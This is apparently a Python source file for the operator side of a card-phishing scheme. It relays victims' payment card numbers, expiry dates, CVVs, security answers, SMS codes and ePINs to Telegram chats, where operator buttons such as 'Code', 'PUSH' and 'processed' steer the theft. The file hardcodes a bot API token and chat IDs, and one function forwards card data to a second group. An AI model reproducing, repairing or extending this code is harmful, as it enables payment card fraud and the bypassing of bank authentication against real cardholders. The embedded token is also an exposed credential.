from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Bot
API_TOKEN = '7183115873:AAGsfeV2XA-QeeURJsWu1IyylJ1a5yCOJkM'
from telegram.error import TelegramError
def send_buttons_message(CHAT_ID, card, date, cvv, ID):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
            InlineKeyboardButton("❓Secret❓", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`', reply_markup=reply_markup, parse_mode='MarkdownV2')
    
def send_secret_question(CHAT_ID, card, date, cvv, question, ID):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("📱Code📱", callback_data='button1'),
        ],
        [
            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
            InlineKeyboardButton("❓Incorrect❓", callback_data='button5'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')

def send_sms(CHAT_ID, card, date, cvv, sms, epin, ID):
    bot = Bot(token=API_TOKEN)
    keyboard = [
        [
            InlineKeyboardButton("✅Отработан✅", callback_data='button1'),
            InlineKeyboardButton("Error SMS", callback_data='button2'),
        ],
        [
            InlineKeyboardButton("Error ePin", callback_data='button3'),
            InlineKeyboardButton("Epin", callback_data='button4'),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}`\nePIN : `{epin}` ', reply_markup=reply_markup, parse_mode='MarkdownV2')

def ne_pizdabol(card, chat_id='-4150791967'):
    try:
        bot = Bot(token=API_TOKEN)
        message = f'{card}'
        bot.send_message(chat_id=chat_id, text=message)
        print("Message sent successfully")
    except TelegramError as e:
        print(f"Failed to send message: {e}")
